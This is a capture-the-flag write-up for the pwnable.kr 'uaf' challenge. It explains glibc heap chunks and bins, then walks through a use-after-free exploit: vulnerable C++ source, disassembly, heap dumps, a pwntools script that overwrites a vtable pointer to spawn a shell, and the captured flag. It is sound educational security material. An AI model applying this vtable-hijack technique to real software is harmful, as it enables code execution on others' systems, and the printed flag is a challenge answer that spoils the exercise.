# uaf

## Description

uaf - 8 pt

> Mommy, what is Use After Free bug? <br> <br>
> ssh uaf@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### The heap

The heap is a region of memory that is dynamically allocated and deallocated by the program. We can allocate memory on the heap by calling `malloc` and free it by calling `free`. Note that the memory allocated by malloc is always aligned to 8 bytes.

The memory in the heap is stored in chunks. Each chunk has a header, that contains the size of the previous chunk, information about the chunk (such as it's size) and then the data itself. for example, here is a chunk of size 0x20:

```
0x614ed4:       0x00000000      0x00000021      0x00000000      0x00000614
0x614ee4:       0x00000000      0x2b63ba16      0x4f1d11e4      0x00614ec8
```

The three least significant bits of the size have special meaning. Most importantly, the least signifcant bit is used to indicate whether the last chunk is free or not. If it's 1, it's free, if it's 0, it's allocated. 

When we allocate memory on the heap, the allocator will search if there is a previously-freed chunk big enough to hold the requested size. If it doesn't find one, it will allocate a new chunk from the end of the heap.

In order to be able to find freed chunks, the allocator tracks them in a series of linked lists called bins.

Before we go into the bins, we need to discuss further the structure of the chunks. As we've stated before, each chunk stores metadat along with the data itself. Well, free chunks too store metadata. Like live allocated chunks, they store the size of the chunk with the three special bits. However, they also store information after the user data region using a technique called “boundary tags”. These boundary tags carry size information before and after the chunk. Thus, chunks can be traversed from any known chunk to any direction, which enables very fast coalescing of adjacent free chunks.

As we stated before, the free chunks are stored in bins that operate as linked lists. So, each free chunk needs to store pointers to other chunks. Since the user data in a free chunk is free, the heap manager repurposes it as the place where this additional metadata lives.

There are 5 types of bins:

* **Small bins:** There are 62 of them, and each small bin stores chunks that are all the same fixed size. Every chunk less than 512 bytes on 32-bit systems (or than 1024 bytes on 64-bit systems) has a corresponding small bin. Since each small bin stores only one size of chunks, insertions and removals are very fast.

* **Large bins:** For chunks over 512 bytes (1024 bytes on 64-bit), the heap manager instead uses “large bins”. Each of the 63 “large bins” operates mostly the same way as small bins, but instead of storing chunks with a fixed size, they instead store chunks within a size range. Because of this, insertions onto the bin have to be manually sorted, and allocations from the bin have to be manually searched.	

* **Unsorted bin:** An optimization cache layer. Instead of immediately putting newly freed chunks onto the correct bin, the heap manager merges it with neighbors, and dumps it onto a general unsorted linked list. During malloc, each item on the unsorted bin is checked to see if it “fits” the request. If it does, malloc can use it immediately. If not, it is removed from the unsorted bin and placed in the correct bin.

* **Fast bins:** Further optimization. These bins keep recently released small chunks, intentionally keeping the chunk alive and not merging it with its neighbors so that it can be immediately repurposed. Like small bins, each fast bin is responsible for a single size of chunk. There are 10 fast bins. In practice, the way fast bins work is the heap manager doesn't set the last bit of the size field of the chunk header to 1, so the chunk is not considered free. Also, since fast-binned chunks are never merged, they can be saved in a singly-linked list, rather than a doubly one. The downside is that fast bins are not truely freed, which can cause the memory to balloon overtime. To resolve this, the heap manager "flushes" the fast bins every so often. 

* **Tcache bins:** On a multithreaded program, the heap can't simply use the bins mentioned above, as they are not thread-safe. That is, a race condition can occur if two threads try to allocate or free memory at the same time. Alas, using locks is not a viable solution, as it would slow down the program. To solve this, the heap manager uses per-thread arenas where each thread gets its own arena until it hits the threshold. Additionaly, per-thread caching speeds up allocations by having per-thread bins of small chunks ready-to-go. And so, when a chunk is freed, the heap manager tries to place it in the appropriate tcache bin. If it is full or the chunk is too big for a tcache bin, the heap manager reverts to our old slow-path strategy of obtaining the heap lock and then processing the chunk as before.


#### Use After Free

Use After Free (UAF) is a vulnerability that occurs when we use a pointer to a chunk after it has been freed. 

A bug like this can be used in many ways. For example, if we allocate a new chunk of the same size as the freed chunk, it will be allocated in the same place as the freed chunk. Thus, we'll be able to control the data that the pointer points to, and possibly take control of the program.

### Exploit

Let's check out the source code:

```c
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

The program creates a `Man` and a `Woman` object, and then gives us a menu to choose from. The first option calls the `introduce` function of both objects. The second option allocates a chunk of memory of a size we choose, and reads data from a file into it. The third option frees both objects.

As the name of the challenge suggest, we'll need to use a UAF bug to get the flag. Let's take a look at the objects in the heap. First, we're going to need to find their addresses. Here are the relevant parts of the disassembly of the `main` function:

```asm
0000000000400ec4 <main>:
  ...
  400f13:	e8 4c 03 00 00       	call   401264 <_ZN3ManC1ESsi>
  ...
  400f71:	e8 92 03 00 00       	call   401308 <_ZN5WomanC1ESsi>
  ...
```

Using gdb to break at the calls to the constructors, we get that the `Man` object's **chunk** starts at `0x614ed4` and the `Woman` object's **chunk** starts at `0x614f24`. Knowing that, we can take a look at the heap:

```
0x614ed4:       0x00000000      0x00000021      0x00000000      0x00401570
0x614ee4:       0x00000000      0x00000019      0x00000000      0x00614ec8

... 

0x614f24:       0x00000000      0x00000021      0x00000000      0x00401550
0x614f34:       0x00000000      0x00000015      0x00000000      0x00614f18
```

Since the classes are fairly similar, let's focus on the `Man` object. The first 2 words of the chunk are the header. Then, we have the `vtable` pointer, which points to the `vtable` of the `Man` class. After that we have the `age` and `name` fields. The `name` field is a pointer to a string, which is stored in the next chunk.

With some debugging, we can figure out that whenever we ask for the `1` option, the program calls `introduce` by using the `vtable` pointers to go to the function that's in offset `0x8` from the start of the `vtable`. 

```asm
  400fcd:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400fd1:	48 8b 00             	mov    (%rax),%rax
  400fd4:	48 83 c0 08          	add    $0x8,%rax
  400fd8:	48 8b 10             	mov    (%rax),%rdx
  400fdb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400fdf:	48 89 c7             	mov    %rax,%rdi
  400fe2:	ff d2                	call   *%rdx
```
Also, it appears that the first address of the `vtable` is the address of the `give_shell`, and unsurprisingly, the address at offset `0x8` is the address of the `introduce` function. 

```
0x401570 <_ZTV3Man+16>: 0x0040117a

0x40117a <_ZN5Human10give_shellEv>:     0xe5894855
```

```
0x401578 <_ZTV3Man+24>: 0x004012d2

0x4012d2 <_ZN3Man9introduceEv>: 0xe5894855
```

So, if we manage to change the `vtable` pointer to point `0x8` bytes back, the offset `0x8` will make it point to the `give_shell` function.

It seems that the `Man` and `Woman` objects are each `0x18` bytes long. So, if we'll use the `3`rd option to free them, and then allocate 2 chunks of `0x18` bytes, those chunks will be allocated in the same place as the `Man` and `Woman` objects.

Since the `2`nd option not only gives us the choice of how many bytes to allocate, but also the choice of which file to read into the allocated memory, we can use it to allocate 2 `0x18` byte chunks, that look like this:

```
0x00000000      0x00000021      0x00000000      0x00401568
0x00000000      0x00000000      0x00000000      0x00000000
```

And then, when we choose the `1`st option, the program will dereference the function pointer `0x00401568 + 0x8` which points to the `give_shell` function. 

```python
from pwn import *

ssh = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')

ssh.mkdir('/tmp/a')
ssh.touch('/tmp/a/exploit')
ssh.upload_data('\x68\x15\x40\x00' + '\x00'*4*3, '/tmp/a/exploit')

p = ssh.process(['./uaf', '24', '/tmp/a/exploit'])
p.sendline(b'3\n2\n2\n1')

p.sendline(b'cat flag')
p.interactive()
```

```
yay_f1ag_aft3r_pwning
```
